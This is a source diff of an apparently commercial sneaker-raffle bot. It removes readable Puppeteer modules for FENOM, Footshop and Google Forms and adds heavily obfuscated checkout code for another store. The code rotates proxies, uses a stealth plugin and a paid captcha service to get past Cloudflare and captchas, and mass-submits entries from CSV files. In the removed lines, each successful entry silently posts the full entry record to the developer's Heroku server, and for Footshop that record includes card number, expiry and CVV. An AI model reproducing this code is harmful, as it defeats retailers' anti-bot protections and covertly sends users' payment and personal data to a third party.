-                                    await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                                }
-                                await sendWebhook(errorWH, EMBEDS.errorDEV);
-                                retry = 'yes';
-                            } finally {
-                                if (browser) {
-
-                                    browser.close();
-                                }
-                                if (retry == 'yes' && t != 5) {
-                                    console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-
-                                    t = t + 1;
-                                    tasks--;
-
-                                    return fenomFunction(currentFunction, fenom, proxies, i, t);
-                                }
-                                if (retry == 'yes' && t >= 5) {
-                                    errorLog(fenom[i], currentFunction)
-
-                                }
-                                if (!skip) {
-                                    console.log(`${getTime()} [${currentFunction.name}] Waiting for ${settings.delay} ms`);
-                                    await delay(settings.delay);
-
-                                }
-
-
-                                tasks--;
-                            }
-
-                        }
-                        fenomFunction(currentFunction, opium, proxies, i);
-                        if (!skip) {
-                            // console.log('skip')
-                            await delay(350);
-                        }
-                    }
-
-                }
-            },
-            {
-                name: 'FENOM Raffle Entries',
-                store: 'FENOM',
-                logo: 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
-                function: async function fenomModule(currentFunction, fenom, proxies) {
-                    puppeteer.use(StealthPlugin());
-                    puppeteer.use(RecaptchaPlugin({
-                        provider: {
-                            id: '2captcha',
-                            token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
-                        },
-                        visualFeedback: true
-                    }))
-                    for (var i = 0; i < fenom.length; i++) {
-                        if (retry != 'yes') {
-                            var retry = '';
-                            var t = 0;
-
-                        }
-                        var ERROR;
-                        try {
-                            await jig(fenom, i);
-
-                        } catch {
-                            retry = 'no';
-                            throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
-                        }
-                        setTitle(`${currentFunction.name} Task ${i + 1} / ${fenom.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-
-
-                        const url = `https://www.fenom.com/en/authentication?create_account=1`;
-                        var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                        var proxySplit = proxies[randomProxy].split(":");
-                        var browser;
-                        try {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: false,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                            });
-
-                        } catch {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: false,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                            });
-                        }
-                        try {
-                            const page = await browser.newPage();
-
-                            const session = await page.target().createCDPSession();
-                            const { windowId } = await session.send('Browser.getWindowForTarget');
-                            await page.authenticate({
-                                username: `${proxySplit[2]}`,
-                                password: `${proxySplit[3]}`,
-                            });
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                            await page.goto(`https://www.fenom.com/en/authentication`, { waitUntil: 'networkidle2' });
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Solving Cloudflare`);
-                            // await delay(3000);
-                            await delay(5000);
-                            var cf = await page.$('.hcaptcha-box');
-                            if (cf) {
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Handling Challenge`);
-                                await delay(10000);
-                                const challengeButton = await page.$('.hcaptcha-box');
-                                if (challengeButton) {
-                                    try {
-
-                                        await challengeButton.click();
-                                    } catch {
-                                        throw new Error('Empty Turnstile Challenge')
-                                    }
-                                }
-                                try {
-                                    await page.waitForSelector('input[name="firstname"]', { timeout: 40000 });
-
-                                } catch {
-                                    var challengeButton2 = await page.$('.hcaptcha-box');
-                                    if (challengeButton2) {
-
-                                        try {
-
-                                            await challengeButton2.click();
-                                        } catch {
-                                            throw new Error('Empty Turnstile Challenge')
-                                        }
-                                    }
-                                }
-                                // await frame.click('#challenge-stage > div > label > input');
-
-                            }
-                            await session.send('Browser.setWindowBounds', { windowId, bounds: { windowState: 'minimized' } });
-                            await delay(8000);
-                            try {
-
-                                await page.waitForSelector('input[name="email"]', { timeout: 120000 });
-                            } catch {
-                                throw new Error('Blocked by cloudflare')
-                            }
-                            await delay(5000);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Logging in`);
-                            await page.type('input[name="email"]', `${fenom[i].Email}`);
-                            await delay(500);
-                            await page.type('input[name="password"]', `${fenom[i].Password}`);
-                            await delay(600);
-                            await page.$eval('#login-form', form => form.submit());
-                            await page.waitForSelector('.product-list.slider-fenom', { timeout: 60000 });
-                            await delay(500);
-                            await page.goto(`${fenom[i].Url}`);
-                            await page.waitForSelector('.prod-variant > ul > li');
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Choosing Size ${fenom[i].Size}`);
-
-                            if (fenom[i].Size != 'RANDOM') {
-                                var size = ` ${fenom[i].Size} `;
-                                const sizeButtons = await page.$x(`//span[contains(text(), ${size})]`);
-                                await sizeButtons[0].click();
-                            } else {
-                                const sizeButtons = await page.$$(`.prod-variant > ul > li`);
-                                var randomSize = Math.round(Math.random() * (sizeButtons.length - 1));
-                                await sizeButtons[randomSize].click();
-
-                            }
-                            await delay(600);
-                            await page.click('#cookieChoiceDismiss');
-                            await delay(1000);
-                            await page.type('#instagram-account', `${fenom[i].Follower}`);
-                            await delay(650);
-                            await page.click('#book-btn');
-                            await delay(3000);
-                            try {
-
-                                await page.waitForSelector('#recaptcha-container > div > div > iframe');
-                            } catch {
-                                throw new Error('Captcha not found')
-                            }
-                            await delay(500);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${chalk.cyan('Solving Captcha')}`);
-                            await page.solveRecaptchas();
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Finishing Entry`);
-
-                            await delay(2000);
-                            await page.$eval('#book-btn-for-sure', btn => btn.click());
-                            await delay(300)
-                            await page.click('#book-btn-for-sure');
-                            await delay(3500);
-                            const success = await page.$eval('.reservation-popup > .title', (element) => {
-                                return element.innerHTML
-                            })
-                            // console.log(success)
-                            if (success) {
-                                retry = 'no';
-                                successfulLog(fenom[i], currentFunction);
-
-                                console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Raffle Entered!`));
-                                var succesDEV = await makeEmbed(fenom[i], currentFunction, 'dev', false);
-                                var succesPUB = await makeEmbed(fenom[i], currentFunction, 'pub', false);
-                                let task = fenom[i]
-                                try {
-                                    prxdata = {
-                                        username: username.replace('#', ''),
-                                        module: currentFunction.name,
-                                        entrydata: JSON.stringify(task),
-                                        proxy: `${proxies[i]}`
-                                    }
-                                    var prx = JSON.stringify(prxdata);
-                                    let config = {
-                                        headers: {
-                                            'content-type': 'application/json',
-                                        }
-                                    }
-                                    await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-                                } catch (e) {
-
-                                }
-                                const EMBEDS =
-                                {
-                                    succesDEVMSG: { embeds: [succesDEV] },
-                                    succesPUBMSG: { embeds: [succesPUB] }
-                                };
-                                try {
-                                    if (settings.webhook != undefined && settings.webhook != '') {
-                                        await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                    }
-                                    await delay(200);
-                                    await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                                    await delay(200);
-                                    await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                                } catch (e) {
-                                    console.log(chalk.yellow(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Error sending webhook ${e}`));
-
+                                for (var _0x2bb5e0 of _0xef7a36) {
+                                    _0x2bb5e0['option1'] == _0x25d5e4 && (_0xe72ef6 = _0x2bb5e0['id']);
                                 }
                             } else {
-                                throw new Error('Error sending entry. Check if duplicate, or proxies.')
+                                var _0x331564 = Math['round'](Math['random']() * (_0xef7a36['length'] - 0x1));
+                                _0xe72ef6 = _0xef7a36[_0x331564]['id'];
                             }
-
-
-                        } catch (e) {
-                            console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-                            ERROR = `${e}`
-                            var errorDEV = await makeEmbed(fenom[i], currentFunction, 'dev', true, ERROR);
-                            var succesDEV = await makeEmbed(fenom[i], currentFunction, 'dev', false);
-                            var succesPUB = await makeEmbed(fenom[i], currentFunction, 'pub', false);
-
-                            const EMBEDS =
-                            {
-                                succesDEVMSG: { embeds: [succesDEV] },
-                                succesPUBMSG: { embeds: [succesPUB] }
-                            };
-                            EMBEDS.errorDEV = { embeds: [errorDEV] }
-                            if (settings.webhook != undefined && settings.webhook != '') {
-                                await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                            }
-                            await sendWebhook(errorWH, EMBEDS.errorDEV);
-                            if (e != 'Error sending entry. Check if duplicate, or proxies.') {
-
-                                retry = 'yes';
-                            }
-                        } finally {
-                            browser.close();
-                            if (retry == 'yes' && t != 5 && ERROR != 'Size Not Found') {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-                                i = i - 1;
-                                t = t + 1;
-                                continue;
-                            }
-                            if (retry == 'yes' && t >= 5) {
-                                errorLog(fenom[i], currentFunction)
-                                retry = 'no';
-                                t = 0;
-                            }
-                            console.log(`${getTime()} [${currentFunction.name}] Waiting for ${settings.delay} ms`);
-                            await delay(settings.delay);
+                            console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x5d1b21('https://raffles.afew-store.com/cart/' + _0xe72ef6 + ':1'), _0x9f4733 = addToCart['request']['res']['responseUrl'];
                         }
-                    }
-                }
-            }
-        ]
-    },
-    {
-        name: "FOOTSHOP",
-        modules: [
-            {
-                name: 'FOOTSHOP Raffle Entries',
-                store: 'Footshop',
-                logo: 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
-                function: async function (currentFunction, footshop, proxies) {
-
-                    puppeteer.use(StealthPlugin());
-                    puppeteer.use(RecaptchaPlugin({
-                        provider: {
-                            id: '2captcha',
-                            token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
-                        },
-                        visualFeedback: true
-                    }))
-                    for (var i = 0; i < footshop.length; i++) {
-                        var ERROR;
-                        if (retry != 'yes') {
-                            var retry = '';
-                            var t = 0;
-
-                        }
-                        var embed = [
-                            {
-                                "type": "rich",
-                                "title": `Succesful Footshop entry`,
-                                "description": "",
-                                "color": 0xc0d6d6,
-                                "fields": [
-                                    {
-                                        "name": `User`,
-                                        "value": `${username}`
-                                    },
-                                    {
-                                        "name": `Product`,
-                                        "value": `${footshop[i].Url}`
-                                    },
-                                    {
-                                        "name": `Size`,
-                                        "value": `${footshop[i].Size}`
-                                    },
-                                    {
-                                        "name": `Delay`,
-                                        "value": `${settings.footshopDelay}`
-                                    },
-                                    {
-                                        "name": `Version`,
-                                        "value": `${version}`
-                                    }
-                                ]
-                            }
-                        ]
-                        var succesDEV = await makeEmbed(footshop[i], currentFunction, 'dev', false);
-                        var succesPUB = await makeEmbed(footshop[i], currentFunction, 'pub', false);
-                        const EMBEDS =
-                        {
-                            succesDEVMSG: { embeds: [succesDEV] },
-                            succesPUBMSG: { embeds: [succesPUB] }
-                        };
-                        const msg = { embeds: embed };
                         try {
-                            await jig(footshop, i);
-
+                            await _0x4fdab9();
+                        } catch (_0x5432ba) {
+                            if (_0x5432ba['message']['includes']('TUNN'))
+                                throw new Error('Proxy\x20Connection\x20Error');
+                            throw new Error('Proxy\x20Error:\x20' + _0x5432ba);
+                        }
+                        const _0x63ef5c = await _0x213ce9['newPage']();
+                        await _0x63ef5c['setDefaultNavigationTimeout'](0x1d4c0), await _0x63ef5c['authenticate']({
+                            'username': '' + _0x2fccad[0x2],
+                            'password': '' + _0x2fccad[0x3]
+                        }), await _0x63ef5c['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x63ef5c['setRequestInterception'](!![]), _0x63ef5c['on']('request', _0x26ae1b => {
+                            _0x26ae1b['resourceType']() === 'image' || _0x26ae1b['resourceType']() === 'font' || _0x26ae1b['resourceType']() === 'media' ? _0x26ae1b['abort']() : _0x26ae1b['continue']();
+                        });
+                        try {
+                            await _0x63ef5c['goto'](_0x9f4733, { 'waituntil': 'networkidle0' });
                         } catch {
-                            retry = 'no';
-                            throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
+                            throw new Error('Connection\x20Error');
                         }
-                        if (footshop[i].Email == '' || footshop[i].FirstName == '' || footshop[i].LastName == '' || footshop[i].Country == '' || footshop[i].Size == '' || footshop[i].Address1 == '' || footshop[i].Zip == '') {
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Invalid CSV`);
-                            continue;
-                        }
-                        // console.log(footshop[i].Url)
-                        // async function getSizePid() {
-                        //     var sizes = await axios.get(`https://releases.footshop.com/api/raffles/yHnlwoQB3xHSyCfZ5_K_`)
-                        //         .then((response) => response.data)
-                        //         .catch(() => undefined);
-                        //     console.log(sizes)
-                        //     var sizePids = sizes.sizeSets.Men.sizes;
-                        //     if (sizePids.length == 0) {
-                        //         sizePids = sizes.sizeSets.Women.sizes;
-                        //         if (sizePids.length == 0) {
-                        //             sizePids = sizes.sizeSets.Unisex.sizes;
-                        //             if (sizePids.length == 0) {
-                        //                 sizePids = sizes.sizeSets.Kids.sizes;
-                        //             }
-                        //         }
-                        //     };
-                        //     async function checkSize() {
-                        //         for (var s = 0; s < sizePids.length; s++) {
-                        //             if (sizePids[s].eur == footshop[i].Size) {
-                        //                 sizeLink = sizePids[s].id
-                        //                 console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Found SizePid`);
-                        //                 return true;
-                        //             }
-                        //         }
-                        //         console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Size ${footshop[i].Size} not found`);
-                        //         return false;
-                        //     };
-                        //     let sizeCheck = await checkSize();
-                        //     if (sizeCheck == false) {
-                        //         return false;
-                        //     }
-
-
-                        // }
-                        // let sizeCheck = await getSizePid();
-                        // if (sizeCheck == false) {
-                        //     continue;
-                        // }
-                        if (footshop[i].Email == '' || footshop[i].FirstName == '' || footshop[i].LastName == '' || footshop[i].Country == '' || footshop[i].Size == '' || footshop[i].Address1 == '' || footshop[i].Zip == '' || footshop[i].Phone == '') {
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Invalid CSV`);
-                            continue;
-                        }
-                        const url = `${footshop[i].Url}`
-
-                        if (settings.useRandomProxy = false) {
-                            var proxySplit = proxies[i].split(":");
-                        } else {
-                            var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                            var proxySplit = proxies[randomProxy].split(":");
-                        }
-
-                        var browser
+                        console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Submitting\x20Information');
                         try {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                            });
-
+                            await _0x63ef5c['waitForSelector']('#checkout_email');
                         } catch {
-                            browser = await puppeteer.launch({
-                                executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                headless: true,
-                                args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                            });
+                            throw new Error('Proxy\x20Error');
                         }
-                        try {
-                            const page = await browser.newPage();
-                            await page.authenticate({
-                                username: `${proxySplit[2]}`,
-                                password: `${proxySplit[3]}`,
-                            });
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                            await page.setRequestInterception(true);
-                            page.on("request", (req) => {
-                                if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-                                    req.abort();
-                                } else {
-                                    req.continue();
-                                }
-                            });
-
-
+                        await _0x63ef5c['type']('#checkout_email', '' + _0x585d00[_0x486823]['Email']), await _0x116d4a(0x320), await _0x63ef5c['type']('#checkout_attributes_instagram', '' + _0x585d00[_0x486823]['Follower']), await _0x116d4a(0x320), await _0x63ef5c['select']('#checkout_shipping_address_country', '' + _0x585d00[_0x486823]['Country']), await _0x63ef5c['waitForTimeout'](0x258), await _0x63ef5c['type']('#checkout_shipping_address_first_name', '' + _0x585d00[_0x486823]['FirstName']), await _0x63ef5c['waitForTimeout'](0x320), await _0x63ef5c['type']('#checkout_shipping_address_last_name', '' + _0x585d00[_0x486823]['LastName']), await _0x63ef5c['waitForTimeout'](0x2bc), await _0x63ef5c['type']('#checkout_shipping_address_address1', _0x585d00[_0x486823]['Address1'] + '\x20' + _0x585d00[_0x486823]['HouseNumber']), await _0x63ef5c['waitForTimeout'](0x2bc), await _0x63ef5c['type']('#checkout_shipping_address_address2', '' + _0x585d00[_0x486823]['Address2']), await _0x63ef5c['waitForTimeout'](0x2bc), await _0x63ef5c['type']('#checkout_shipping_address_zip', '' + _0x585d00[_0x486823]['Zip']), await _0x63ef5c['waitForTimeout'](0x2bc), await _0x63ef5c['type']('#checkout_shipping_address_city', '' + _0x585d00[_0x486823]['City']), await _0x63ef5c['waitForTimeout'](0x2bc);
+                        if (_0x585d00[_0x486823]['State'] != '')
                             try {
-                                await page.goto(url);
-                                await delay(3000);
-                                await page.waitForSelector('.control__JhutY');
-
-                            } catch {
-                                throw new Error('Proxy Error')
-                            }
-                            await page.click('.control__JhutY');
-                            await delay(500);
-                            if (footshop[i].Size != 'RANDOM') {
-                                try {
-                                    const sizeButtons = await page.$x(`//div[contains(text(), '${footshop[i].Size}')]`);
-                                    await sizeButtons[0].click();
-                                } catch {
-                                    console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Size Not Found`));
-                                    continue;
-                                }
-                            } else {
-                                const sizeButtons = await page.$$('.options__3UQpT > div.row');
-                                var randomSize = Math.round(Math.random() * (sizeButtons.length - 1));
-                                await sizeButtons[randomSize].click();
-                            }
-                            await delay(1200);
-                            const enterButton = await page.$x("//span[contains(text(), 'Enter raffle now')]");
-                            await enterButton[0].click();
-
-                            await page.waitForSelector('input[name="email"]');
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Filling Entry Credentials`);
-                            await page.type('input[name="email"]', `${footshop[i].Email}`);
-                            await delay(1600);
-                            await page.type('input[name="phone"]', `${footshop[i].Phone}`);
-                            await delay(1200);
-                            await page.click('button.btn.continue-button__1RtsS');
-                            await delay(1200);
-                            try {
-                                await page.type('input[name="firstName"]', `${footshop[i].FirstName}`);
-                                await delay(600);
-                            } catch {
-                                const errorMessage = await page.$$eval('.invalid-feedback > div', err => {
-                                    return err.map(err => err.innerText);
-                                });
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${errorMessage}`));
-                                continue;
-                            }
-                            await page.type('input[name="lastName"]', `${footshop[i].LastName}`);
-                            await delay(200);
-                            await page.type('input[name="instagramUsername"]', `${footshop[i].Follower}`);
-                            await delay(1200);
-                            await page.click('button.btn.continue-button__1RtsS');
-                            await delay(1000);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Filling Shipping`);
-                            await page.select('select[name="country"]', `${footshop[i].Country}`);
-                            await delay(700);
-                            await page.type('input[name="streetName"]', `${footshop[i].Address1}`);
-                            await delay(600);
-                            await page.type('input[name="houseNumber"]', `${footshop[i].HouseNumber} ${footshop[i].Address2}`);
-                            await delay(200);
-                            await page.type('input[name="postalCode"]', `${footshop[i].Zip}`);
-                            await delay(500);
-                            await page.type('input[name="city"]', `${footshop[i].City}`);
-                            await delay(1200);
-                            await page.click('input[name="consent::privacy-policy-101"]');
-                            await delay(1200);
-                            await page.click('button.btn.continue-button__1RtsS');
-                            await delay(1200);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Solving hCaptcha`);
-                            await page.solveRecaptchas();
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : hCaptcha solved`);
-                            await delay(3000);
-                            await page.click('button.btn.continue-button__1RtsS');
-                            await delay(5000);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Solving Adyen`);
-                            await page.waitForSelector('span[data-cse="encryptedCardNumber"]');
-                            await page.click('span[data-cse="encryptedCardNumber"]');
-                            await delay(1200);
-                            await page.type('span[data-cse="encryptedCardNumber"]', `${footshop[i].CardNumber}`);
-                            await delay(800);
-                            await page.click('span[data-cse="encryptedExpiryDate"]');
-                            await page.type('span[data-cse="encryptedExpiryDate"]', `${footshop[i].ExpiryDate}`);
-                            await delay(1200);
-                            await page.click('span[data-cse="encryptedSecurityCode"]');
-                            await page.type('span[data-cse="encryptedSecurityCode"]', `${footshop[i].CVV}`);
-                            await delay(550);
-                            await page.type('input[name="holderName"]', `${footshop[i].NameOnCard}`);
-                            await delay(550);
-                            await page.click('button.adyen-checkout__button');
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Awaiting 3DS`);
-
-                            try {
-                                await page.waitForSelector('.thank-you__1AwOo', { timeout: 300000 });
-                                await delay(3000);
-
-                            } catch (e) {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : 3DS Failed`));
-                                ERROR = `3DS Error ${e}`;
-                                var errorDEV = await makeEmbed(footshop[i], currentFunction, 'dev', true, ERROR);
-                                EMBEDS.errorDEV = { embeds: [errorDEV] }
-                                if (settings.webhook != undefined && settings.webhook != '') {
-                                    await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                                }
-                                await sendWebhook(errorWH, EMBEDS.errorDEV);
-                                continue;
-                            }
-                            successfulLog(footshop[i], currentFunction);
-
-                            console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Raffle Entered!`));
-                            let task = footshop[i]
-                            try {
-                                prxdata = {
-                                    username: username.replace('#', ''),
-                                    module: currentFunction.name,
-                                    entrydata: JSON.stringify(task),
-                                    proxy: `${proxies[i]}`
-                                }
-                                var prx = JSON.stringify(prxdata);
-                                let config = {
-                                    headers: {
-                                        'content-type': 'application/json',
-                                    }
-                                }
-                                await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-                            } catch (e) {
-
-                            }
-                            if (settings.webhook != undefined && settings.webhook != '') {
-                                try {
-
-                                    await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                } catch {
-
-                                }
-                            }
-                            await delay(200);
-                            await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                            await delay(200);
-                            try {
-
-                                await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                            } catch {
-
-                            }
-                        } catch (e) {
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`);
-                            ERROR = `${e}`;
-                            var errorDEV = await makeEmbed(footshop[i], currentFunction, 'dev', true, ERROR);
-                            EMBEDS.errorDEV = { embeds: [errorDEV] }
-                            if (settings.webhook != undefined && settings.webhook != '') {
-                                await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                            }
-                            await sendWebhook(errorWH, EMBEDS.errorDEV);
-                            retry = 'yes';
-                        } finally {
-                            browser.close();
-                            if (retry == 'yes' && t != 5) {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-                                i = i - 1;
-                                t = t + 1;
-                                continue;
-                            }
-                            console.log(`Waiting for ${settings.delay} ms`);
-                            await delay(settings.delay);
-                        }
-                    }
-                }
-            }
-        ]
-    },
-    {
-        name: "Google Forms",
-        modules: [
-            {
-                name: 'SMART ENTRIES',
-                store: 'Google Forms',
-                logo: 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
-                function: async function (currentFunction, csv, proxies) {
-                    let raffleData = {
-                        FirstName: '',
-                        LastName: '',
-                        Email: '',
-                        Country: '',
-                        Address: '',
-                        City: '',
-                        Zip: '',
-                        Size: '',
-                        Phone: '',
-
-                    }
-                    let custom = 0;
-                    let strict = 0;
-                    function log(c) {
-                        console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${c}`);
-                    }
-                    puppeteer.use(StealthPlugin());
-                    puppeteer.use(RecaptchaPlugin({
-                        provider: {
-                            id: '2captcha',
-                            token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
-                        },
-                        visualFeedback: true
-                    }))
-                    for (var i = 0; i < csv.length; i++) {
-                        var ERROR;
-                        if (retry != 'yes') {
-                            if (!retry) {
-                                var retry = '';
-
-                            } else {
-                                retry = '';
-                            }
-                            var t = 0;
-
-                        }
-                        try {
-                            await jig(csv, i);
-
-                        } catch {
-                            retry = 'no';
-                            throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
-                        }
-                        if (csv[i].Email == '' || csv[i].FirstName == '' || csv[i].LastName == '' || csv[i].Country == '' || csv[i].Size == '' || csv[i].Address1 == '' || csv[i].Zip == '') {
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Invalid CSV`);
-                            continue;
-                        }
-
-
-
-
-                        if (settings.useRandomProxy = false) {
-                            var proxySplit = proxies[i].split(":");
-                        } else {
-                            var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                            var proxySplit = proxies[randomProxy].split(":");
-                        }
-
-                        var browser
-                        // log(proxySplit.length)
-                        if (proxySplit.length == 1) {
-                            // log('hi')
-                            try {
-                                browser = await puppeteer.launch({
-                                    executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                    headless: true,
-                                    args: ['--no-sandbox', '--disable-setuid-sandbox'],
-                                });
-
-                            } catch {
-                                browser = await puppeteer.launch({
-                                    executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                    headless: true,
-                                    args: ['--no-sandbox', '--disable-setuid-sandbox'],
-                                    env: { LANGUAGE: "en-US" }
-                                });
-                            }
-                        } else {
-
-                            try {
-                                browser = await puppeteer.launch({
-                                    executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                    headless: true,
-                                    args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                });
-
-                            } catch {
-                                browser = await puppeteer.launch({
-                                    executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                    headless: true,
-                                    args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                    env: { LANGUAGE: "en-US" }
-                                });
-                            }
-                        }
-                        try {
-                            let filled = {
-                                first: false
-                            }
-
-                            const page = await browser.newPage();
-                            if (proxySplit.length != 0)
-                                await page.authenticate({
-                                    username: `${proxySplit[2]}`,
-                                    password: `${proxySplit[3]}`,
-                                });
-                            await page.setExtraHTTPHeaders({
-                                'Accept-Language': 'en-US'
-                            });
-                            log(`Getting Session`);
-                            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                            await page.setRequestInterception(true);
-                            page.on("request", (req) => {
-                                if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-                                    req.abort();
-                                } else {
-                                    req.continue();
-                                }
-                            });
-
-
-                            try {
-                                await page.goto(csv[i].Url, { waitUntil: 'networkidle0' });
-                                await delay(3000);
-                                await page.waitForSelector('.teQAzf');
-
-                            } catch (e) {
-                                throw new Error(e)
-                            }
-                            let questions = await page.$$('.o3Dpx > div[role="listitem"]');
-                            // console.log(raffleData)
-                            for (question of questions) {
-                                // console.log('question found')
-                                let title = await question.$eval('.M7eMe', el => el.textContent);
-                                if (custom != 0) {
-                                    // console.log('triggered != custom')
-                                    let customFilled = false;
-                                    for (let cus = 0; cus < custom; cus++) {
-                                        // console.log(title)
-                                        // console.log(raffleData[`custom${cus}`].title)
-                                        if (title == raffleData[`custom${cus}`].title) {
-                                            // console.log(title)
-                                            // console.log(raffleData[`custom${cus}`].title)
-                                            log(`Custom Selector found; ${title}`);
-                                            let inputField = await question.$('input[jsname="YPqjbf"]'); // retrieve the input element
-                                            let inputTextArea = await question.$('textarea[jsname="YPqjbf"]'); // retrieve the input element
-                                            if (inputField) {
-                                                await inputField.type(`${raffleData[`custom${cus}`].answer}`); // type into the input element
-
-                                            }
-                                            else if (inputTextArea) {
-                                                await inputTextArea.type(`${raffleData[`custom${cus}`].answer}`); // type into the input element
-
-                                            }
-                                            customFilled = true;
+                                const _0x3c83a8 = JSON['parse'](_0x65e0bc['readFileSync']('States.json', 'utf8'));
+                                await _0x116d4a(0x1f4);
+                                if (_0x585d00[_0x486823]['State']['length'] > 0x2)
+                                    for (let _0x2a7724 of _0x3c83a8) {
+                                        if (_0x2a7724['Province'] == _0x585d00[_0x486823]['State']) {
+                                            await _0x63ef5c['select']('#checkout_shipping_address_province', _0x2a7724['Code']);
                                             break;
                                         }
                                     }
-                                    if (customFilled) {
-                                        await delay(350)
-                                        continue;
-                                    }
-                                }
-
+                                else
+                                    await _0x63ef5c['select']('#checkout_shipping_address_province', _0x585d00[_0x486823]['State']['toUpperCase']());
